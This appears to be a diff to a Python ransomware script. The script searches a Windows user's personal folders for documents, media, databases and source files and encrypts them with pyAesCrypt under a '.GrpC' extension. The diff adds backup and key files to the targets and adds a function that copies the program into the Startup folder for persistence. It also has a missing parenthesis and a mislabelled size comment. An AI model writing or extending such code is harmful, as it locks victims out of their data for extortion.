@@ -1,15 +1,17 @@
 import os
 import subprocess
+import sys
+from shutil import copy
 from hashlib import sha256, sha512
 from pyAesCrypt import encryptFile, decryptFile
 
-project_name = "Team Hacking Tool.exe"
+project_name = sys.argv[0]
 filext = ".GrpC"
 filelimit = 1024 * 1024 # 1 GB
 
 def find_files(mode="E"):
     allFiles = []
-    valid_extensions = ["exe", "doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "zip", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd"]
+    valid_extensions = ["exe", "doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "zip", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd", "bak", "key"]
     allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
     username = os.path.expanduser("~")
     for dirs in allowed_dirs:
@@ -44,6 +46,14 @@ def decryptFiles(files, password):
 def filter_file_size(files):
     files = list(filter(lambda x: x.st_size <= filelimit, files)
     return files
+
+def persistence():
+    username = os.path.expanduser("~")
+    path = os.path.join(username, "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+    current_path = os.path.join(os.getcwd(), project_name)
+    if not os.path.exists(os.path.join(path, project_name)):
+        copy(current_path, path)
+
 
 def genpass():
      password = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip())
